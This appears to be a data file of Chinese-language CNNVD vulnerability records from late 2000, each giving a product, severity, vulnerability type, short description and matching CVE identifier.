+SuSE linuxnfs/knfsd rpc.kstatd权限提升漏洞,CNNVD-200010-050,2000-10-20,2005-10-20,超危,授权问题,SuSE，可能还包括其他Linux系统中linuxnfs或knfsd数据包的rpc.kstatd存在字符串句法分析错误漏洞。远程攻击者可以利用该漏洞获取根权限。,CVE-2000-0800
+O'Reilly WebSite Pro写访问漏洞,CNNVD-200010-058,2000-10-20,2006-09-22,高危,配置错误,O'Reilly WebSite Pro 2.3.7版本安装带有对全部用户执行许可的uploader.exe程序。远程攻击者可以通过直接调用uploader.exe创建并执行任意文件。,CVE-2000-0769
+Bardon Data Systems WinU密码弱加密漏洞,CNNVD-200010-016,2000-10-20,2005-10-20,中危,授权问题,WinU 5.x及其之前的版本使用弱加密存储其配置密码，本地用户可以利用该漏洞译码并获取权限。,CVE-2000-0789
+多个供应商java.net.URLConnection分支程序直接连接漏洞,CNNVD-200010-123,2000-10-20,2005-10-20,超危,授权问题,MacOS Runtime Java (MRJ) 2.1版本及之前版本和MacOS的Microsoft虚拟机(VM)中的URLConnection函数存在漏洞。在Java安全模式的违反中，恶意网站操作者可以通过使用HTTP重定向来连接到任意主机。,CVE-2000-0563
+Linux Minicom创建文件漏洞,CNNVD-200010-087,2000-10-20,2006-09-21,低危,授权问题,Linux系统的Minicom 1.82.1及其早期版本存在漏洞。本地用户可以借助符号链接攻击创建任意属于uucp用户的文件。,CVE-2000-0698
+IRC Xchat client命令执行漏洞,CNNVD-200010-031,2000-10-20,2005-05-16,高危,授权问题,IRC Xchat client 1.4.2及其之前的版本存在漏洞。远程攻击者可以通过创建web浏览器的XChat URL shell元字符编码执行任意命令。,CVE-2000-0787
+Robotex Viking 服务器缓冲区溢出漏洞,CNNVD-200010-060,2000-10-20,2005-10-20,高危,授权问题,"RobTex Viking服务器1.06-370之前版本存在缓冲区溢出漏洞。远程攻击者可以借助超长HTTP GET请求或超长Unless-Modified-Since, If-Range，或If-Modified-Since头导致服务拒绝。",CVE-2000-0775
+IIS访问限制绕过漏洞,CNNVD-200010-114,2000-10-20,2005-10-12,中危,授权问题,"IIS 4.0和5.0版本不能在它们的父文件夹有较少限制许可时正确限制到某些文件类型的访问，远程攻击者可能绕过一些文件的访问限制，该漏洞也称为""File Permission Canonicalization"" 漏洞。",CVE-2000-0770
+"Helix代码 ""go-gnome"" /tmp符号链接漏洞",CNNVD-200010-063,2000-10-20,2005-10-20,低危,其他,"go-gnome Helix GNOME预安装存在漏洞。本地用户可以借助对包含 uudecode, snarf和一些安装文件的多种in /tmp文件的符号链接攻击覆盖任意文件。",CVE-2000-0724
+NAI Net Tools PKI server strong.exe代码执行漏洞,CNNVD-200010-042,2000-10-20,2005-05-02,高危,授权问题,NAI Net Tools PKI server 1.0 HotFix 3之前版本的strong.exe存在格式化字符串漏洞。远程攻击者可以借助扩展名为.XUDA的URL格式化字符串执行任意代码。,CVE-2000-0741
+Microsoft Outlook Vcard DoS漏洞,CNNVD-200010-074,2000-10-20,2005-10-20,中危,授权问题,Microsoft Outlook 2000不正确处理vCard (.vcf)文件中的超长或畸形字段。攻击者可以利用该漏洞导致服务拒绝。,CVE-2000-0756
+Raptor GFX配置工具pgxconfig缓冲区溢出漏洞,CNNVD-200010-069,2000-10-20,2005-10-20,高危,授权问题,Raptor GFX配置工具pgxconfig存在缓冲区溢出漏洞。本地用户可以借助命令行选项提升特权。,CVE-2000-0695
+Pragma Systems TelnetServer 2000缓冲区溢出漏洞,CNNVD-200010-108,2000-10-20,2005-05-02,低危,授权问题,Pragma Systems TelnetServer 2000 4.0版本存在缓冲区溢出漏洞。远程攻击者可以借助到rexec端口的一系列超长空字符来导致服务拒绝。,CVE-2000-0708
+eTrust Access Control 安全漏洞,CNNVD-200010-072,2000-10-20,2021-04-12,超危,其他,eTrust Access Control (formerly SeOS)默认安装使用默认密钥。远程攻击者可以欺骗eTrust管理员并提升特权。,CVE-2000-0762
+Zope任务添加或修改漏洞,CNNVD-200010-102,2000-10-20,2005-05-02,高危,授权问题,Zope 2.2.1之前版本不能正确限制对getRoles类函数的访问，可编辑DTML的用户可以通过修改请求中包含的任务列表来添加或修改任务。,CVE-2000-0725
+suidperl(也称为sperl) /bin/mail权限提升漏洞,CNNVD-200010-039,2000-10-20,2005-10-12,高危,授权问题,suidperl(也称为sperl)在调用/bin/mail发送错误报告前不正确清除转义序列，本地用户可以利用该漏洞通过设置“interactive”环境变量，以及调用文件名包含转义序列的suidperl获取权限。,CVE-2000-0703
+Bajie Webserver文件读取漏洞,CNNVD-200010-009,2000-10-20,2005-10-12,低危,路径遍历,"Bajie HTTP web server 0.30a版本存在漏洞。远程攻击者借助包含""....""即多个点点目录遍历攻击的URL读取任意文件。",CVE-2000-0773
+Microsoft Windows 2000拒绝服务漏洞,CNNVD-200010-037,2000-10-20,2005-10-12,低危,授权问题,Microsoft Windows 2000存在漏洞。本地用户可以借助畸形RPC通信损坏本地安全策略，从而导致服务拒绝，也称为“Local Security Policy Corruption”漏洞。,CVE-2000-0771
+Gnome Lokkit访问限制漏洞,CNNVD-200010-132,2000-10-20,2005-05-02,高危,授权问题,Gnome Lokkit防火墙程序包0.41之前版本不能正确限制到一些端口的访问，即使用户不使任何服务可用。,CVE-2000-0792
+因特网新闻服务器(inn)缓冲区溢出漏洞,CNNVD-200010-062,2000-10-20,2005-05-02,低危,授权问题,INN 2.2.1及其早期版本存在缓冲区溢出漏洞。远程攻击者可以借助恶意格式化条款导致服务拒绝。,CVE-2000-0360
+IRIX gr_osview缓冲区溢出漏洞,CNNVD-200010-027,2000-10-20,2005-05-13,高危,授权问题,IRIX 6.2和6.3版本的gr_osview存在缓冲区溢出漏洞。本地用户可以借助超长-D选项获取权限。,CVE-2000-0797
+Watchguard Firebox服务拒绝漏洞,CNNVD-200010-089,2000-10-20,2005-05-02,低危,授权问题,Watchguard Firebox II版本存在漏洞。远程攻击者可以通过向端口4100的授权服务发送畸形URL导致服务拒绝。,CVE-2000-0783
+VariCAD文件覆盖漏洞,CNNVD-200010-073,2000-10-20,2005-10-20,中危,授权问题,VariCAD 7.0版本安装全局可写文件。本地用户可以利用该漏洞用特洛伊木马程序替换VariCAD程序。,CVE-2000-0719
+Gnome安装系统配置文件覆盖漏洞,CNNVD-200010-015,2000-10-20,2005-10-20,中危,授权问题,Helix GNOME Updater helix-update 0.5及其之前的版本不正确创建/tmp目录，本地用户可以创建空系统配置文件，如/etc/config.d/bashrc，/etc/config.d/csh.cshrc，和/etc/rc.config。,CVE-2000-0723
+PGP任意数据解密漏洞,CNNVD-200010-118,2000-10-20,2006-09-22,低危,授权问题,PGP 5.5.x版本到6.5.3版本在Additional Decryption Key (ADK)存储于公共证书的已签字部分时不能被正确检查，可能修改受害人公共证书的攻击者可以解密任何带有修改证书的被加密数据。,CVE-2000-0678
+Solaris AnswerBook2远程命令执行漏洞,CNNVD-200010-135,2000-10-20,2005-10-20,超危,授权问题,Solaris AnswerBook2中dwhttpd web服务器的管理界面存在漏洞。界面用户可以借助shell元字符来远程执行命令。,CVE-2000-0697
+FreeBSD服务拒绝漏洞,CNNVD-200010-082,2000-10-20,2005-05-02,低危,授权问题,"FreeBSD 5.x,4.x,和3.x版本存在漏洞。本地用户可以通过执行带有畸形ELF图像头的程序导致服务拒绝。",CVE-2000-0729
+Intel Express交换机服务拒绝漏洞,CNNVD-200010-092,2000-10-20,2006-09-05,低危,授权问题,Intel Express 500序列交换机存在漏洞。远程攻击者可以借助畸形IP数据包导致服务拒绝。,CVE-2000-0764
+WircSrv IRC服务器读取任意文件漏洞,CNNVD-200010-081,2000-10-20,2005-10-20,中危,授权问题,WircSrv IRC Server 5.07s版本存在漏洞。IRC操作者可以借助importmotd命令行读取任意文件，设置今日消息(MOTD)为指定文件。,CVE-2000-0785
+NAI Net Tools PKI server strong.exe命令执行漏洞,CNNVD-200010-021,2000-10-20,2005-05-02,低危,授权问题,NAI Net Tools PKI server 1.0 HotFix 3之前版本的strong.exe存在缓冲区溢出漏洞。远程攻击者可以借助HTTPS端口的超长URL执行任意命令。,CVE-2000-0740
+Raptor GFX pgxconfig命令执行漏洞,CNNVD-200010-051,2000-10-20,2005-10-12,高危,授权问题,Raptor GFX配置工具中的pgxconfig使用“cp”程序调用系统的相关路径名，本地用户可以利用该漏洞通过修改其指向交替“cp”程序的路径执行任意命令。,CVE-2000-0693
+Cisco Gigabit Switch Routers (GSR)转发数据包漏洞,CNNVD-200010-085,2000-10-20,2005-08-17,超危,授权问题,带有Fast Ethernet / Gigabit Ethernet卡的从IOS版本11.2(15)GS1A 到11.2(19)GS0.2版本和其他一些12.0版本的Cisco Gigabit Switch Routers (GSR)不能正确线卡故障。远程攻击者可以利用该漏洞绕过ACLs或迫使接口特征转发数据包。,CVE-2000-0700
+Web模式ntop文件执行漏洞,CNNVD-200010-052,2000-10-20,2005-08-17,低危,授权问题,Web模式的ntop存在漏洞。远程攻击者可以借助..（点 点）攻击读取任意文件。,CVE-2000-0705
+CGI Script Center Auction Weaver目录遍历漏洞,CNNVD-200010-034,2000-10-20,2005-10-20,低危,授权问题,Auction Weaver CGI script 1.03及其之前的版本存在漏洞。远程攻击者可以借助fromfile参数中的..（点 点）攻击读取任意文件。,CVE-2000-0686
+HP OpenView Network Node Manager (NMM)加密漏洞,CNNVD-200010-115,2000-10-20,2005-05-02,低危,授权问题,与密码有关的HP OpenView Network Node Manager (NMM) 6.1版本存在漏洞。,CVE-2000-0754
+GNU Mailman本地格式化字符串漏洞,CNNVD-200010-055,2000-10-20,2005-10-20,中危,授权问题,mailman 2.0beta3和2.0beta4版本的wrapper程序不能正确不可信格式化字符串。本地用户可以利用该漏洞提升特权。,CVE-2000-0701
+FreeBSD端口brouted安装许可漏洞,CNNVD-200010-065,2000-10-20,2005-10-20,高危,授权问题,FreeBSD和可能其他OSes的brouted存在缓冲区溢出漏洞。本地用户可以借助超长命令行参数提升根目录特权。,CVE-2000-0752
+Microsoft Windows IPX protocol implementation拒绝服务漏洞,CNNVD-200010-035,2000-10-20,2005-10-12,低危,授权问题,Microsoft Windows 95和98的IPX protocol implementation存在漏洞。远程攻击者可以通过发送源IP地址为广播地址的ping数据包导致服务拒绝。,CVE-2000-0742
+NAI Net Tools PKI server文件泄露漏洞,CNNVD-200010-025,2000-10-20,2005-05-02,低危,路径遍历,NAI Net Tools PKI server 1.0 HotFix 3之前的版本存在目录遍历漏洞。远程攻击者可以借助注册服务器HTTPS请求的..（点 点）攻击读取任意文件。,CVE-2000-0739
+Tumbleweed MMS No默认密码漏洞,CNNVD-200010-066,2000-10-20,2005-10-20,高危,授权问题,"Tumbleweed Messaging Management System(MMS)4.6及其之前版本Tumbleweed安装创建无密码默认账户""sa""。",CVE-2000-0772
+OS2/Warp 4.5 FTP服务器服务拒绝漏洞,CNNVD-200010-128,2000-10-20,2005-05-02,中危,授权问题,OS2/Warp 4.5 FTP服务器存在漏洞。远程攻击者可以借助超长用户名来导致服务拒绝。,CVE-2000-0761
+IBM Net.Data db2www CGI程序缓冲区溢出漏洞,CNNVD-200010-056,2000-10-20,2005-05-02,超危,授权问题,IBM Net.Data db2www CGI程序存在缓冲区溢出漏洞。远程攻击者可以借助超长PATH_INFO环境变量执行任意命令。,CVE-2000-0677
+CGI脚本中心Subscribe Me LITE管理密码变更漏洞,CNNVD-200010-061,2000-10-20,2005-10-20,高危,授权问题,Subscribe Me LITE不再正授权证改变管理员密码行为。远程攻击者可以通过直接调用带有setpwd参数的subscribe.pl脚本提升帐户管理员特权。,CVE-2000-0688
+PHP-Nuke admin.php3特权提升漏洞,CNNVD-200010-111,2000-10-20,2005-08-17,中危,授权问题,PHP-Nuke中admin.php3不能正确核实PHP-Nuke管理员密码，远程攻击者可以通过请求不指定aid或pwd参数的URL来提升特权。,CVE-2000-0745
+Worm HTTP服务器目录遍历漏洞,CNNVD-200010-124,2000-10-20,2005-05-02,低危,路径遍历,Worm HTTP服务器存在目录遍历漏洞。远程攻击者可以借助..（点 点）攻击来读取任意文件。,CVE-2000-0731
+WebShield SMTP拒绝服务漏洞,CNNVD-200010-014,2000-10-20,2005-05-02,低危,授权问题,WebShield SMTP 4.5存在漏洞。远程攻击者可以通过发送格式为地址结尾带有一个.（周期）的电子邮件导致服务拒绝，该漏洞可以导致WebShield连续发送该邮件的复制文件。,CVE-2000-0738
+CGI Script Center Auction Weaver远程命令执行漏洞,CNNVD-200010-048,2000-10-20,2005-10-20,超危,授权问题,Auction Weaver CGI script 1.02及其之前的版本存在漏洞。远程攻击者可以借助fromfile参数中的shell元字符执行任意命令。,CVE-2000-0690
+Mediahouse Statistics Server执行命令漏洞,CNNVD-200010-064,2000-10-20,2005-08-17,高危,授权问题,Mediahouse Statistics Server 5.02x版本存在漏洞。远程攻击者可以借助超长HTTP GET请求执行任意命令。,CVE-2000-0776
+thttpd tdate_parse()堆溢出漏洞,CNNVD-200010-006,2000-10-20,2006-08-03,高危,授权问题,Trivial HTTP (THTTPd)存在缓冲区溢出漏洞。远程攻击者借助超长If-Modified-Since头导致服务拒绝或者执行任意命令。,CVE-2000-0359
+Raptor GFX pgxconfig权限提升漏洞,CNNVD-200010-040,2000-10-20,2005-08-17,低危,授权问题,Raptor GFX配置工具中的pgxconfig存在漏洞。本地用户可以借助符号链接攻击获取权限。,CVE-2000-0694
+ISS RealSecure 3.2.x Fragmented SYN数据包DoS漏洞,CNNVD-200010-084,2000-10-20,2005-10-20,低危,其他,ISS RealSecure 3.2.1和3.2.2版本存在漏洞。远程攻击者可以借助带有SYN标志设置的分段数据包导致服务拒绝。,CVE-2000-0692
+BEA WebLogic Java JHTML代码编译执行漏洞,CNNVD-200010-113,2000-10-20,2005-07-26,高危,授权问题,BEA WebLogic 5.1.x版本不正确限制到PageCompileServlet的访问，远程攻击者可能通过直接在任意源文件中调用控制器来编译和执行Java JHTML代码。,CVE-2000-0685
+BEA WebLogic server代理插件命令执行漏洞,CNNVD-200010-047,2000-10-20,2007-05-04,超危,授权问题,BEA WebLogic server代理插件存在缓冲区溢出漏洞。远程攻击者可以借助扩展名为.JSP的超长URL执行任意命令。,CVE-2000-0681
+HP-UX 10.20 ftp格式字符串漏洞,CNNVD-200010-129,2000-10-20,2005-05-02,高危,授权问题,HP-UX 10.20版本中ftpd存在格式字符串漏洞。远程攻击者可以借助PASS命令中的格式字符串来导致服务拒绝或执行任意命令。,CVE-2000-0699
+OpenLDAP 'ud'群组可写漏洞,CNNVD-200010-053,2000-10-20,2005-10-20,中危,授权问题,OpenLDAP 1.2.11及其之前的版本不正确安装权限为群组可写的ud二进制代码，该群组的任意用户可以利用该漏洞借助特洛伊木马移动二进制代码。,CVE-2000-0748
+BEA WebLogic代码编译执行漏洞,CNNVD-200010-121,2000-10-20,2005-08-17,高危,授权问题,BEA WebLogic 5.1.x版本不能正确限制到JSPServlet的访问，远程攻击者可能通过直接调用任意源文件上的控制器来编译和执行Java JSP代码。,CVE-2000-0684
+Solaris AnswerBook2管理员界面访问控制漏洞,CNNVD-200010-018,2000-10-20,2005-10-20,高危,授权问题,Solaris AnswerBook2的dwhttpd web服务器管理员界面不正确认证其支持的CGI脚本请求，远程攻击者可以利用该漏洞通过直接调用管理员CGI脚本向界面添加用户账户。,CVE-2000-0696
+BAIR权限提升漏洞,CNNVD-200010-013,2000-10-20,2005-10-20,低危,授权问题,BAIR程序没有正确限制Internet Explorer Internet选项菜单，本地用户可以通过修改启用BAIR的注册表项，从而获取菜单访问权限。,CVE-2000-0802
+xpdf PDF任意命令执行漏洞,CNNVD-200010-119,2000-10-20,2005-05-02,高危,授权问题,xpdf PDF查看器客户端0.91之前版本不能正确发动嵌入URL的web浏览器，攻击者可以借助含shell元字符的URL来执行任意命令。,CVE-2000-0727
+GNU userv访问限制绕过漏洞,CNNVD-200010-133,2000-10-20,2005-05-02,中危,授权问题,GNU userv 1.0.0版本及之前版本不正确执行文件说明符调换，该漏洞可能损坏USERV_GROUPS和USERV_GIDS环境变量，本地用户可以绕过一些访问限制。,CVE-2000-0786
+PCCS MySQLDatabase Admin Tool Manager信息泄露漏洞,CNNVD-200010-023,2000-10-20,2005-05-02,高危,授权问题,PCCS MySQLDatabase Admin Tool Manager 1.2.4及其之前的版本在web根目录安装dbconnect.inc文件时存在漏洞，远程攻击者可以利用该漏洞获取敏感信息如管理员密码。,CVE-2000-0707
+xpdf PDF任意文件覆盖漏洞,CNNVD-200010-125,2000-10-20,2005-05-02,高危,授权问题,xpdf PDF查看器客户端0.91之前版本存在漏洞。本地用户可以借助符号连接攻击来覆盖任意文件。,CVE-2000-0728
+Windows 98上Microsoft Internet Explorer插入Trojan木马程序漏洞,CNNVD-200010-010,2000-10-20,2005-08-17,中危,授权问题,Windows 98上Microsoft Internet Explorer 5.5版本中基于web的文件夹显示存在漏洞。本地用户通过修改Folder.htt文件且使用ShellDefView ActiveX控件中的InvokeVerb方式为文件夹中的第一个文件指明默认执行选项从而插入Trojan木马程序。,CVE-2000-0790
+Microsoft Outlook邮件客户端漏洞,CNNVD-200010-086,2000-10-20,2005-05-02,低危,授权问题,Microsoft Outlook邮件客户端使用普适文件格式(RTF)文件的winmail.dat附件鉴定发送机器的物理路径。,CVE-2000-0753
+IPSWITCH IMail web服务器漏洞,CNNVD-200010-093,2000-10-20,2005-05-02,中危,授权问题,IPSWITCH IMail 6.04及其早期版本的web服务器存在漏洞。远程攻击者可以借助..(点 点)攻击读取和删除任意文件。,CVE-2000-0780
+Lyris List Manager获取管理访问权限漏洞,CNNVD-200010-007,2000-10-20,2005-05-02,中危,授权问题,Lyris List Manager 3和4版本的web界面存在漏洞。列表订阅者通过修改list_admin隐藏的格式字段值获取管理访问权限。,CVE-2000-0758
+IRIX inpview竞争条件漏洞,CNNVD-200010-105,2000-10-20,2005-05-02,高危,授权问题,SGI IRIX 5.3版本到IRIX 6.5.10版本中InPerson的inpview存在漏洞。本地用户可以借助对.ilmpAAA暂时文件的符号连接攻击来提升特权。,CVE-2000-0799
+IRIX dmplay权限提升漏洞,CNNVD-200010-041,2000-10-20,2005-05-02,高危,授权问题,IRIX 6.2和6.3版本的dmplay存在缓冲区溢出漏洞。本地用户可以借助超长命令行选项获取根权限。,CVE-2000-0796
+Trustix Apache-SSL RPM权限漏洞,CNNVD-200010-044,2000-10-20,2005-10-20,中危,授权问题,Trustix安装Apache-SSL的httpsd程序时设为全域可写权限，本地用户可以使用特洛伊木马移动该程序。,CVE-2000-0791
+Bajie Webserver绝对路径泄露漏洞,CNNVD-200010-101,2000-10-20,2005-10-20,低危,授权问题,"Bajie HTTP web server 0.30a版本中的样板Java控制器""test""泄露web文档根的实际路径名。",CVE-2000-0774
+编号撤回,CNNVD-200010-095,2000-10-20,2022-08-18,,授权问题,该CVE编号已撤回。,CVE-2000-0744
+Red Hat Linux 安全漏洞,CNNVD-200010-107,2000-10-20,2022-08-18,中危,其他,Red Hat Linux中的initscripts程序包存在安全漏洞。本地用户可以借助符号连接攻击来提升特权。,CVE-2000-0031
+CVS客户端创建任意文件漏洞,CNNVD-200010-077,2000-10-20,2005-05-02,低危,授权问题,CVS 1.10.8版本客户端信任CVS服务器提供的路径名。服务器强制客户端创建任意文件。,CVE-2000-0679
+Becky! Internet Mail头缓冲区溢出漏洞,CNNVD-200010-080,2000-10-20,2005-10-20,低危,授权问题,Becky! Internet Mail客户端1.26.04及其之前版本存在缓冲区溢出漏洞。远程攻击者可以借助超长内容类型：当用户转发消息时产生的MIME头，导致服务拒绝。,CVE-2000-0736
+Microsoft Internet Explorer 安全漏洞,CNNVD-200010-130,2000-10-20,2021-07-26,低危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 4.x版本和5.x版本中的函数不能正确验证浏览器窗户中的帧域，远程攻击者可以读取客户端文件，也称为""Frame Domain Verification""漏洞的变体。",CVE-2000-0768
+HP OpenView Network Node Manager 6.1 Web密码漏洞,CNNVD-200010-127,2000-10-20,2005-10-20,中危,授权问题,HP-UX 11.00版本中的newgrp命令存在漏洞。本地用户可以提升特权。,CVE-2000-0755
+IRIX libgl.so缓冲区溢出漏洞,CNNVD-200010-024,2000-10-20,2005-10-20,高危,授权问题,IRIX libgl.so library存在缓冲区溢出漏洞。本地用户可以借助程序如(1)gmemusage，和(2)gr_osview的超长HOME变量获取根权限。,CVE-2000-0794
+Pagelog.cgi远程文件泄漏/创建漏洞,CNNVD-200012-158,2000-10-29,2012-11-28,中危,授权问题,pagelog.cgi是Metertek (Metertek@yahoo.com)写的一个记录页面访问的脚本程序。 pagelog.cgi存在目录遍历漏洞，该漏洞源于脚本没有检查用户输入的路径和文件信息变量的'../'，远程攻击者利用该漏洞读取任意文件。,CVE-2000-0940
+Unify eWave ServletExec远程拒绝服务攻击漏洞,CNNVD-200012-060,2000-10-31,2005-10-20,低危,其他,"Unify的eWave ServletExec是一个JSP和Java Servlet引擎，用作流行的web服务器如Apache、IIS、Netscape等的插件。 eWave ServletExec处理异常请求时存在漏洞，远程攻击者可能利用此漏洞对eWave进行拒绝服务攻击。 给ServletExec servlet引擎发送一个URL请求会导致其异常终止。可以通过在URL中加上servlet路径前缀""/servlet""来强制执行任意servlet。在服务器端的类中存在一个名为""ServletExec""的servlet。通过强制方式来执行""ServletExec""servlet将导致servlet引擎重新初始化并试图在80口上绑定一个服务器线程。如果服务器已经运行，端口绑定操作将导致一个异常，servlet引擎异常终止。",CVE-2000-1025
+gcc和g++应用程序侵害漏洞,CNNVD-200011-001,2000-11-01,2005-10-20,中危,授权问题,gcc和g++ 3.3.3版本及之前版本中的-ftrapv编译选项不处理所有整数溢出类型，使应用程序可能易受与缓冲区有关的漏洞的侵害。,CVE-2000-1219
+Quake 1 (quake1)和 ProQuake服务拒绝漏洞,CNNVD-200011-002,2000-11-01,2005-05-02,低危,授权问题,Quake 1 (quake1)以及ProQuake 1.01版本和之前版本存在漏洞。远程攻击者可以借助畸形（空）UDP数据包来导致服务拒绝。,CVE-2000-1080
+EFTP拒绝服务漏洞,CNNVD-200011-061,2000-11-14,2006-09-05,高危,授权问题,EFTP缓冲区溢出漏洞。远程攻击者可以通过超长字符串导致服务拒绝。,CVE-2000-0870
+Fastream FTP++缓冲区溢出漏洞,CNNVD-200011-035,2000-11-14,2005-10-20,高危,授权问题,Fastream FTP++ 2.0版本存在缓冲区溢出漏洞。远程攻击者借助超长用户名导致服务拒绝且可能执行任意命令。,CVE-2000-0831
+Xmail缓冲区溢出漏洞,CNNVD-200011-056,2000-11-14,2005-10-20,超危,授权问题,XMail POP3 server 0.59之前的版本存在缓冲区溢出漏洞。远程攻击者可以借助超长USER命令执行任意命令。,CVE-2000-0840
+Tridia Double Vision缓冲区溢出漏洞,CNNVD-200011-039,2000-11-14,2005-05-02,高危,授权问题,Tridia Double Vision 3.07.00版本中的dvtermtype存在缓冲区溢出漏洞。本地用户借助超长终端类型参数获取根特权。,CVE-2000-0865
+Check Point VPN-1/FireWall-1缓冲区溢出漏洞,CNNVD-200011-028,2000-11-14,2006-01-04,低危,授权问题,Check Point VPN-1/FireWall-1 4.1及其早期版本的组件间通讯机制中协议检查器的Getkey存在缓冲区溢出漏洞。远程攻击者利用该漏洞导致服务拒绝。,CVE-2000-0809
+Red Hat Linux tmpwatch utility拒绝服务漏洞,CNNVD-200011-068,2000-11-14,2005-05-02,低危,授权问题,Red Hat Linux的tmpwatch utility将每个目录层次划分为新的进程，本地用户可以利用该漏洞通过创建/tmp或/var/tmp/的深层目录导致服务拒绝。,CVE-2000-0829
+Sun Java Web Server Web Admin / Bullettin Board漏洞,CNNVD-200011-014,2000-11-14,2005-10-20,高危,授权问题,Sun Java web server中的管理模块存在漏洞。远程攻击者通过上传Java代码到模块且通过请求以/servlet/标记开始的URL调用com.sun.server.http.pagecompile.jsp92.JspServlet从而执行任意命令。,CVE-2000-0812
+Internet 1.2 Mobius DocumentDirect缓冲区溢出漏洞,CNNVD-200011-045,2000-11-14,2005-10-20,超危,授权问题,nternet 1.2版本的Mobius DocumentDirect中ddicgi.exe查询存在缓冲区溢出漏洞。远程攻击者借助超长GET请求执行任意命令。,CVE-2000-0826
+NT认证PAM模块缓冲区溢出漏洞,CNNVD-200011-010,2000-11-14,2005-10-20,高危,授权问题,pam_smb和pam_ntdom可插拔认证模块(PAM)存在缓冲区溢出漏洞。远程攻击者借助具有超长用户名的注册执行任意命令。,CVE-2000-0843
+Allaire Spectra管理界面工具读取或者修改敏感配置信息漏洞,CNNVD-200011-007,2000-11-14,2005-05-02,中危,授权问题,Allaire Spectra 1.0.1版本的管理界面工具存在漏洞。远程攻击者利用该漏洞读取或者修改敏感配置信息。,CVE-2000-0862
+SuSE Linux Apache读取源代码漏洞,CNNVD-200011-027,2000-11-14,2006-08-03,低危,授权问题,SuSE Linux 6.4版本中Apache 1.3.12的默认配置存在漏洞。远程攻击者通过调换带有/cgi-bin-sdb/的被请求URL中的/cgi-bin/从而读取源代码。,CVE-2000-0868
+LPPlus dccscan无特权读取漏洞,CNNVD-200011-023,2000-11-14,2005-10-20,低危,授权问题,LPPlus中的dccscan setuid程序不正确的检测用户是否有打印指定到dccscan文件的权限，本地用户利用该漏洞打印任意文件。,CVE-2000-0881
+Ipswitch IMail Web服务“HOST”拒绝服务漏洞,CNNVD-200011-049,2000-11-14,2005-05-02,低危,授权问题,Ipswitch Imail 6.0存在漏洞。远程攻击者可以借助发送的超长Host头部中的大量连接导致服务拒绝，该漏洞可以导致崩溃威胁。,CVE-2000-0825
+FreeBSD eject缓冲区溢出漏洞,CNNVD-200011-020,2000-11-14,2005-05-02,高危,授权问题,FreeBSD，还可能有其他Oses上的eject存在多个缓冲区溢出漏洞。本地用户利用该漏洞提升根特权。,CVE-2000-0852
+Compaq Tru64 kdebugd远程任意文件写入漏洞,CNNVD-200011-036,2000-11-14,2005-10-20,中危,授权问题,Digital Unix 4.0F版本中的kdebug守护进程存在漏洞。远程攻击者通过指明初始化数据包中的空文件名读取任意文件。,CVE-2000-0845
+Mailman执行任意命令漏洞,CNNVD-200011-015,2000-11-14,2005-05-02,高危,授权问题,Mailman 1.1版本存在漏洞。目录管理员借助%(listname)宏观扩展中的shell元字符执行任意命令。,CVE-2000-0861
+Fastream FUR HTTP server服务拒绝漏洞,CNNVD-200011-013,2000-11-14,2005-05-02,低危,授权问题,Fastream FUR HTTP server 1.0b版本存在漏洞。远程攻击者借助超长GET请求导致服务拒绝。,CVE-2000-0838
+"SCO Unixware ""/search97cgi/vtopic""漏洞",CNNVD-200011-008,2000-11-14,2005-10-20,低危,其他,"UnixWare 7 scohelphttp webserver中的search97cgi/vtopic""存在漏洞。远程攻击者借助..(点 点）攻击读取任意文件。",CVE-2000-0842
+LPPlus许可DoS漏洞,CNNVD-200011-043,2000-11-14,2005-10-20,低危,授权问题,"LPPlus程序dccsched,dcclpdser,dccbkst, dccshut,dcclpdshut,和dccbkstshut安装了setuid根且具有全域可执行性，任意本地用户利用该漏洞启动和停止多种LPD服务。",CVE-2000-0879
+Htgrep CGI查询读取任意文件漏洞,CNNVD-200011-046,2000-11-14,2005-10-20,低危,授权问题,Htgrep CGI查询存在漏洞。远程攻击者通过指明hdr参数中的完整路径名读取任意文件。,CVE-2000-0832
+GNOME esound Unix域套接字产物竞态条件漏洞,CNNVD-200011-038,2000-11-14,2005-05-02,低危,授权问题,GNOME esound 0.2.19及其早期版本中Unix域套接字的产物存在竞态条件漏洞。本地用户借助符号链接攻击改变任意文件和目录的权限，且获取额外的特权。,CVE-2000-0864
+LPPlus许可DoS漏洞,CNNVD-200011-021,2000-11-14,2005-10-20,低危,授权问题,LPPlus创建带有全域可写权限的lpdprocess文件。本地用户通过指明交替的进程ID且使用setuid dcclpdshut程序中断lpdprocess文件中指定的进程从而中断任意进程。,CVE-2000-0880
+Darxite缓冲区溢出漏洞,CNNVD-200011-012,2000-11-14,2005-05-02,中危,授权问题,Darxite 0.4及其早期版本存在缓冲区溢出漏洞。远程攻击者借助超长用户名或者密码执行任意命令。,CVE-2000-0846
+IBM WebSphere web application server (WAS)缓冲区溢出漏洞,CNNVD-200011-031,2000-11-14,2006-08-21,低危,授权问题,IBM WebSphere web application server (WAS)存在缓冲区溢出漏洞。远程攻击者借助超长Host:请求头执行任意命令。,CVE-2000-0848
+Internet 1.2 Mobius DocumentDirect缓冲区溢出漏洞,CNNVD-200011-042,2000-11-14,2005-10-20,超危,授权问题,Internet 1.2版本的Mobius DocumentDirect中ddicgi.exe存在缓冲区溢出漏洞。远程攻击者借助超长User-Agent参数执行任意命令。,CVE-2000-0828
+NTMail web配置服务器服务拒绝漏洞,CNNVD-200011-022,2000-11-14,2005-05-02,低危,授权问题,NTMail V5和V6版本的web配置服务器存在漏洞。远程攻击者借助一系列不完整的HTTP请求导致服务拒绝。,CVE-2000-0859
+mailto CGI脚本执行任意命令漏洞,CNNVD-200011-026,2000-11-14,2005-05-02,高危,授权问题,mailto CGI脚本存在漏洞。远程攻击者借助emailadd格式字段中的shell元字符执行任意命令。,CVE-2000-0878
+MailForm 2.0 XX-attach_file漏洞,CNNVD-200011-006,2000-11-14,2005-05-02,低危,授权问题,MailForm 2.0版本的mailform.pl CGI脚本存在漏洞。远程攻击者通过指明XX-attach_file参数中的文件名读取任意文件。该漏洞将MailForm发送给攻击者。,CVE-2000-0877
+SunFTP build缓冲区溢出漏洞,CNNVD-200011-037,2000-11-14,2006-09-05,高危,授权问题,SunFTP build 9(1)版本存在缓冲区溢出漏洞。远程攻击者借助超长GET请求导致服务拒绝且可能执行任意命令。,CVE-2000-0856
